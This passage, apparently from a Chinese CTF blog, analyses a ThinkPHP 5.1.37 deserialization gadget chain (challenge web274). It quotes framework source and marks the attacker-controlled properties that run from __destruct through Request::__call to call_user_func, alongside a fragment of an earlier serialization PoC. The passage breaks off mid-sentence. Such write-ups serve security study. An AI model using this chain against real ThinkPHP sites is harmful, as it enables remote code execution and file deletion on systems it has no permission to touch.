class_">use</span> <span class="title class_">Illuminate</span>\<span class="title class_">Foundation</span>\<span class="title class_">Testing</span>\<span class="title class_">PendingCommand</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">PendingCommand</span>()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="web274-Tp5-1"><a href="#web274-Tp5-1" class="headerlink" title="web274 Tp5.1"></a>web274 Tp5.1</h1><p>源码下载</p>
<p><a href="https://github.com/top-think/framework/releases/tag/v5.1.37">https://github.com/top-think/framework/releases/tag/v5.1.37</a></p>
<h2 id="启动服务"><a href="#启动服务" class="headerlink" title="启动服务"></a>启动服务</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php think run</span><br><span class="line">然后就可以在浏览器中访问</span><br><span class="line">http://localhost:8000</span><br></pre></td></tr></table></figure>

<h2 id="利用链子"><a href="#利用链子" class="headerlink" title="利用链子"></a>利用链子</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\thinkphp\library\think\process\pipes\Windows.php - &gt; __destruct()</span><br><span class="line"></span><br><span class="line">\thinkphp\library\think\process\pipes\Windows.php - &gt; removeFiles()</span><br><span class="line"></span><br><span class="line">Windows.php: file_exists()</span><br><span class="line"></span><br><span class="line">thinkphp\library\think\model\concern\Conversion.php - &gt; __toString()</span><br><span class="line"></span><br><span class="line">thinkphp\library\think\model\concern\Conversion.php - &gt; toJson() </span><br><span class="line"></span><br><span class="line">thinkphp\library\think\model\concern\Conversion.php - &gt; toArray()</span><br><span class="line"></span><br><span class="line">thinkphp\library\think\Request.php   - &gt; __call()</span><br><span class="line"></span><br><span class="line">thinkphp\library\think\Request.php   - &gt; isAjax()</span><br><span class="line"></span><br><span class="line">thinkphp\library\think\Request.php - &gt; param()</span><br><span class="line"></span><br><span class="line">thinkphp\library\think\Request.php - &gt; input()</span><br><span class="line"></span><br><span class="line">thinkphp\library\think\Request.php - &gt; filterValue()</span><br></pre></td></tr></table></figure>

<h2 id="源码审计"><a href="#源码审计" class="headerlink" title="源码审计"></a>源码审计</h2><p>全局搜索__destruct</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#/thinkphp/library/think/process/pipes/Windows.php</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">close</span>();  <span class="comment">//没什么作用可以忽略</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">removeFiles</span>();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>crtl+b 跟进removeFiles</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#/thinkphp/library/think/process/pipes/Windows.php</span></span><br><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">removeFiles</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;files <span class="keyword">as</span> <span class="variable">$filename</span>) &#123;  <span class="comment">//files 为数组，遍历整个数组</span></span><br><span class="line">           <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>)) &#123;  <span class="comment">////若存在该文件名便删除文件</span></span><br><span class="line">               @<span class="title function_ invoke__">unlink</span>(<span class="variable">$filename</span>);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="variable language_">$this</span>-&gt;files = [];</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>这里调用了一个<code>$this-&gt;files</code>，而且这里的变量<code>$files</code>是可控的。所以这里存在一个任意文件删除的漏洞，<code>$filename</code>会被作为字符串处理，所以会触发__tostring,</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#\thinkphp\library\think\model\concern\Conversion.php</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">toJson</span>();</span><br><span class="line">    &#125;<span class="comment">// 然后跟进toJson(),如下</span></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 转换当前模型对象为JSON字符串</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span>  integer $options json参数</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">toJson</span>(<span class="params"><span class="variable">$options</span> = JSON_UNESCAPED_UNICODE</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$this</span>-&gt;<span class="title function_ invoke__">toArray</span>(), <span class="variable">$options</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">toArray</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$item</span>       = [];</span><br><span class="line">        <span class="variable">$hasVisible</span> = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">      ......</span><br><span class="line">        <span class="comment">// 追加属性（必须定义获取器）</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;append)) &#123;                  <span class="comment">//在poc中$this-&gt;append = [&quot;lin&quot;=&gt;[&quot;calc.exe&quot;,&quot;calc&quot;]];</span></span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;append <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$name</span>) &#123;  <span class="comment">//遍历append，此时$key=&#x27;lin&#x27;,$name=[&quot;calc.exe&quot;,&quot;calc&quot;]</span></span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$name</span>)) &#123;  <span class="comment">//当name 为数字时进入循环</span></span><br><span class="line">                    <span class="comment">// 追加关联对象属性</span></span><br><span class="line">                    <span class="variable">$relation</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getRelation</span>(<span class="variable">$key</span>);  <span class="comment">//$relation=null,下面分析</span></span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (!<span class="variable">$relation</span>) &#123;</span><br><span class="line">                        <span class="variable">$relation</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getAttr</span>(<span class="variable">$key</span>);  </span><br><span class="line">                        <span class="comment">//通过后面的分析发现$relation 来自 getAttr($key) 中的 $value 来 getData() 中的 $this-&gt;data[$name] 可控</span></span><br><span class="line">                        <span class="keyword">if</span> (<span class="variable">$relation</span>) &#123;</span><br><span class="line">                            <span class="variable">$relation</span>-&gt;<span class="title function_ invoke__">visible</span>(<span class="variable">$name</span>); <span class="comment">//visible 不存在将会调用__call</span></span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">            .......</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>getRelation详情如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#thinkphp/library/think/model/concern/RelationShip.php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getRelation</span>(<span class="params"><span class="variable">$name</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_null</span>(<span class="variable">$name</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;relation;</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">array_key_exists</span>(<span class="variable">$name</span>, <span class="variable">$this</span>-&gt;relation)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;relation[<span class="variable">$name</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>getAttr进行分析</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 获取器 获取数据对象的值</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>  string $name 名称</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>  array  $item 数据</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> mixed</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> InvalidArgumentException</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getAttr</span>(<span class="params"><span class="variable">$name</span>, &amp;<span class="variable">$item</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="variable">$notFound</span> = <span class="literal">false</span>;</span><br><span class="line">        <span class="variable">$value</span>    = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getData</span>(<span class="variable">$name</span>);  <span class="comment">// 这里将传入参数进行修饰</span></span><br><span class="line">    &#125; <span class="keyword">catch</span> (<span class="built_in">InvalidArgumentException</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">        <span class="variable">$notFound</span> = <span class="literal">true</span>;</span><br><span class="line">        <span class="variable">$value</span>    = <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检测属性获取器</span></span><br><span class="line">    <span class="variable">$fieldName</span> = <span class="title class_">Loader</span>::<span class="title function_ invoke__">parseName</span>(<span class="variable">$name</span>);</span><br><span class="line">    <span class="variable">$method</span>    = <span class="string">&#x27;get&#x27;</span> . <span class="title class_">Loader</span>::<span class="title function_ invoke__">parseName</span>(<span class="variable">$name</span>, <span class="number">1</span>) . <span class="string">&#x27;Attr&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;withAttr[<span class="variable">$fieldName</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$notFound</span> &amp;&amp; <span class="variable">$relation</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">isRelationAttr</span>(<span class="variable">$name</span>)) &#123;</span><br><span class="line">            <span class="variable">$modelRelation</span> = <span class="variable language_">$this</span>-&gt;<span class="variable">$relation</span>();</span><br><span class="line">            <span class="variable">$value</span>         = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getRelationData</span>(<span class="variable">$modelRelation</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$closure</span> = <span class="variable language_">$this</span>-&gt;withAttr[<span class="variable">$fieldName</span>];</span><br><span class="line">        <span class="variable">$value</span>   = <span class="variable">$closure</span>(<span class="variable">$value</span>, <span class="variable language_">$this</span>-&gt;data);</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">method_exists</span>(<span class="variable">$this</span>, <span class="variable">$method</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$notFound</span> &amp;&amp; <span class="variable">$relation</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">isRelationAttr</span>(<span class="variable">$name</span>)) &#123;</span><br><span class="line">            <span class="variable">$modelRelation</span> = <span class="variable language_">$this</span>-&gt;<span class="variable">$relation</span>();</span><br><span class="line">            <span class="variable">$value</span>         = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getRelationData</span>(<span class="variable">$modelRelation</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$value</span> = <span class="variable language_">$this</span>-&gt;<span class="variable">$method</span>(<span class="variable">$value</span>, <span class="variable language_">$this</span>-&gt;data);</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;type[<span class="variable">$name</span>])) &#123;</span><br><span class="line">        <span class="comment">// 类型转换</span></span><br><span class="line">        <span class="variable">$value</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">readTransform</span>(<span class="variable">$value</span>, <span class="variable">$this</span>-&gt;type[<span class="variable">$name</span>]);</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (<span class="variable language_">$this</span>-&gt;autoWriteTimestamp &amp;&amp; <span class="title function_ invoke__">in_array</span>(<span class="variable">$name</span>, [<span class="variable">$this</span>-&gt;createTime, <span class="variable">$this</span>-&gt;updateTime])) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$this</span>-&gt;autoWriteTimestamp) &amp;&amp; <span class="title function_ invoke__">in_array</span>(<span class="title function_ invoke__">strtolower</span>(<span class="variable">$this</span>-&gt;autoWriteTimestamp), [</span><br><span class="line">            <span class="string">&#x27;datetime&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;date&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;timestamp&#x27;</span>,</span><br><span class="line">        ])) &#123;</span><br><span class="line">            <span class="variable">$value</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">formatDateTime</span>(<span class="variable">$this</span>-&gt;dateFormat, <span class="variable">$value</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$value</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">formatDateTime</span>(<span class="variable">$this</span>-&gt;dateFormat, <span class="variable">$value</span>, <span class="literal">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (<span class="variable">$notFound</span>) &#123;</span><br><span class="line">        <span class="variable">$value</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getRelationAttribute</span>(<span class="variable">$name</span>, <span class="variable">$item</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$value</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#thinkphp/library/think/model/concern/Attribute.php</span></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 获取对象原始数据 如果不存在指定字段返回false</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span>  string $name 字段名 留空获取全部</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> mixed</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> InvalidArgumentException</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getData</span>(<span class="params"><span class="variable">$name</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_null</span>(<span class="variable">$name</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;data;</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">array_key_exists</span>(<span class="variable">$name</span>, <span class="variable">$this</span>-&gt;data)) &#123; <span class="comment">//判断键名是否存在于this-&gt;data</span></span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;data[<span class="variable">$name</span>];  <span class="comment">// 这里可以控制data 的值</span></span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">array_key_exists</span>(<span class="variable">$name</span>, <span class="variable">$this</span>-&gt;relation)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;relation[<span class="variable">$name</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">InvalidArgumentException</span>(<span class="string">&#x27;property not exists:&#x27;</span> . <span class="built_in">static</span>::<span class="variable language_">class</span> . <span class="string">&#x27;-&gt;&#x27;</span> . <span class="variable">$name</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="call"><a href="#call" class="headerlink" title="__call()"></a>__call()</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#thinkphp/library/think/Request.php</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$method</span>, <span class="variable">$args</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">array_key_exists</span>(<span class="variable">$method</span>, <span class="variable">$this</span>-&gt;hook)) &#123;  <span class="comment">//hook = [&quot;visible&quot;=&gt;[$this,&quot;isAjax&quot;]];</span></span><br><span class="line">        <span class="title function_ invoke__">array_unshift</span>(<span class="variable">$args</span>, <span class="variable">$this</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">call_user_func_array</span>(<span class="variable">$this</span>-&gt;hook[<span class="variable">$method</span>], <span class="variable">$args</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&#x27;method not exists:&#x27;</span> . <span class="built_in">static</span>::<span class="variable language_">class</span> . <span class="string">&#x27;-&gt;&#x27;</span> . <span class="variable">$method</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>call_user_func_array()</code> 方法 并且 <code>$method</code> 是可控的</p>
<p>但是内容 <code>$args</code> 不可控 <code>array_unshift() 函数用于向数组插入新元素。新数组的值将被插入到数组的开头。</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">input</span>(<span class="params"><span class="variable">$data</span> = [], <span class="variable">$name</span> = <span class="string">&#x27;&#x27;</span>, <span class="variable">$default</span> = <span class="literal">null</span>, <span class="variable">$filter</span> = <span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="keyword">if</span> (<span class="literal">false</span> === <span class="variable">$name</span>) &#123;</span><br><span class="line">           <span class="comment">// 获取原始数据</span></span><br><span class="line">           <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="variable">$name</span> = (<span class="keyword">string</span>) <span class="variable">$name</span>;</span><br><span class="line">       <span class="keyword">if</span> (<span class="string">&#x27;&#x27;</span> != <span class="variable">$name</span>) &#123;</span><br><span class="line">           <span class="comment">// 解析name</span></span><br><span class="line">           <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$name</span>, <span class="string">&#x27;/&#x27;</span>)) &#123;</span><br><span class="line">               <span class="keyword">list</span>(<span class="variable">$name</span>, <span class="variable">$type</span>) = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;/&#x27;</span>, <span class="variable">$name</span>);</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">           <span class="variable">$data</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getData</span>(<span class="variable">$data</span>, <span class="variable">$name</span>);</span><br><span class="line"></span><br><span class="line">           <span class="keyword">if</span> (<span class="title function_ invoke__">is_null</span>(<span class="variable">$data</span>)) &#123;</span><br><span class="line">               <span class="keyword">return</span> <span class="variable">$default</span>;</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">           <span class="keyword">if</span> (<span class="title function_ invoke__">is_object</span>(<span class="variable">$data</span>)) &#123;</span><br><span class="line">               <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="comment">// 解析过滤器</span></span><br><span class="line">       <span class="variable">$filter</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getFilter</span>(<span class="variable">$filter</span>, <span class="variable">$default</span>);</span><br><span class="line">       <span class="comment">//`&#x27;&#x27; == $name` 时 不满足条件 当 `$data` 不为数组时 执行 `filterValue()`方法</span></span><br><span class="line">       <span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$data</span>)) &#123;</span><br><span class="line">           <span class="title function_ invoke__">array_walk_recursive</span>(<span class="variable">$data</span>, [<span class="variable">$this</span>, <span class="string">&#x27;filterValue&#x27;</span>], <span class="variable">$filter</span>);</span><br><span class="line">           <span class="keyword">if</span> (<span class="title function_ invoke__">version_compare</span>(PHP_VERSION, <span class="string">&#x27;7.1.0&#x27;</span>, <span class="string">&#x27;&lt;&#x27;</span>)) &#123;</span><br><span class="line">               <span class="comment">// 恢复PHP版本低于 7.1 时 array_walk_recursive 中消耗的内部指针</span></span><br><span class="line">               <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">arrayReset</span>(<span class="variable">$data</span>);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">           <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">filterValue</span>(<span class="variable">$data</span>, <span class="variable">$name</span>, <span class="variable">$filter</span>); <span class="comment">// 进入这里</span></span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$type</span>) &amp;&amp; <span class="variable">$data</span> !== <span class="variable">$default</span>) &#123;</span><br><span class="line">           <span class="comment">// 强制类型转换</span></span><br><span class="line">           <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">typeCast</span>(<span class="variable">$data</span>, <span class="variable">$type</span>);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">filterValue</span>(<span class="params">&amp;<span class="variable">$value</span>, <span class="variable">$key</span>, <span class="variable">$filters</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$default</span> = <span class="title function_ invoke__">array_pop</span>(<span class="variable">$filters</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$filters</span> <span class="keyword">as</span> <span class="variable">$filter</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">is_callable</span>(<span class="variable">$filter</span>)) &#123;</span><br><span class="line">                <span class="comment">// 调用函数或者方法过滤</span></span><br><span class="line">                <span class="variable">$value</span> = <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$filter</span>, <span class="variable">$value</span>);<span class="comment">//$filter 是可控的</span></span><br><span class="line">            &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">is_scalar</span>(<span class="variable">$value</span>)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="literal">false</span> !== <span class="title function_ invoke__">strpos</span>(<span class="variable">$filter</span>, <span class="string">&#x27;/&#x27;</span>)) &#123;</span><br><span class="line">                    <span class="comment">// 正则过滤</span></span><br><span class="line">                    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="variable">$filter</span>, <span class="variable">$value</span>)) &#123;</span><br><span class="line">                        <span class="comment">// 匹配不成功返回默认值</span></span><br><span class="line">                        <span class="variable">$value</span> = <span class="variable">$default</span>;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">elseif</span> (!<span class="keyword">empty</span>(<span class="variable">$filter</span>)) &#123;</span><br><span class="line">                    <span class="comment">// filter函数不存在时, 则使用filter_var进行过滤</span></span><br><span class="line">                    <span class="comment">// filter为非整形值时, 调用filter_id取得过滤id</span></span><br><span class="line">                    <span class="variable">$value</span> = <span class="title function_ invoke__">filter_var</span>(<span class="variable">$value</span>, <span class="title function_ invoke__">is_int</span>(<span class="variable">$filter</span>) ? <span class="variable">$filter</span> : <span class="title function_ invoke__">filter_id</span>(<span class="variable">$filter</span>));</span><br><span class="line">                    <span class="keyword">if</span> (<span class="literal">false</span> === <span class="variable">$value</span>) &#123;</span><br><span class="line">                        <span class="variable">$value</span> = <span class="variable">$default</span>;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>param()方法调用</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">param</span>(<span class="params"><span class="variable">$name</span> = <span class="string">&#x27;&#x27;</span>, <span class="variable">$default</span> = <span class="literal">null</span>, <span class="variable">$filter</span> = <span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="keyword">if</span> (!<span class="variable language_">$this</span>-&gt;mergeParam) &#123;</span><br><span class="line">           <span class="variable">$method</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">method</span>(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">           <span class="comment">// 自动获取请求变量</span></span><br><span class="line">           <span class="keyword">switch</span> (<span class="variable">$method</span>) &#123;</span><br><span class="line">               <span class="keyword">case</span> <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">                   <span class="variable">$vars</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">post</span>(<span class="literal">false</span>);</span><br><span class="line">                   <span class="keyword">break</span>;</span><br><span class="line">               <span class="keyword">case</span> <span class="string">&#x27;PUT&#x27;</span>:</span><br><span class="line">               <span class="keyword">case</span> <span class="string">&#x27;DELETE&#x27;</span>:</span><br><span class="line">               <span class="keyword">case</span> <span class="string">&#x27;PATCH&#x27;</span>:</span><br><span class="line">                   <span class="variable">$vars</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">put</span>(<span class="literal">false</span>);</span><br><span class="line">                   <span class="keyword">break</span>;</span><br><span class="line">               <span class="keyword">default</span>:</span><br><span class="line">                   <span class="variable">$vars</span> = [];</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">           <span class="comment">// 当前请求参数和URL地址中的参数合并</span></span><br><span class="line">           <span class="variable language_">$this</span>-&gt;param = <span class="title function_ invoke__">array_merge</span>(<span class="variable">$this</span>-&gt;param, <span class="variable">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="literal">false</span>), <span class="variable">$vars</span>, <span class="variable">$this</span>-&gt;<span class="title function_ invoke__">route</span>(<span class="literal">false</span>));</span><br><span class="line"></span><br><span class="line">           <span class="variable language_">$this</span>-&gt;mergeParam = <span class="literal">true</span>;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (<span class="literal">true</span> === <span class="variable">$name</span>) &#123;</span><br><span class="line">           <span class="comment">// 获取包含文件上传信息的数组</span></span><br><span class="line">           <span class="variable">$file</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">file</span>();</span><br><span class="line">           <span class="variable">$data</span> = <span class="title function_ invoke__">is_array</span>(<span class="variable">$file</span>) ? <span class="title function_ invoke__">array_merge</span>(<span class="variable">$this</span>-&gt;param, <span class="variable">$file</span>) : <span class="variable language_">$this</span>-&gt;param;</span><br><span class="line"></span><br><span class="line">           <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">input</span>(<span class="variable">$data</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$default</span>, <span class="variable">$filter</span>);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">input</span>(<span class="variable">$this</span>-&gt;param, <span class="variable">$name</span>, <span class="variable">$default</span>, <span class="variable">$filter</span>);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>这里<code>$param</code> 是完全可控的 因此 也就是 <code>input()</code> 的 <code>$data</code> 也是可控的 相当于 <code>call_user_func</code>的<code>$value</code> 可控了，现在需要满足 <code>$name</code> 为字符串 查找</p>
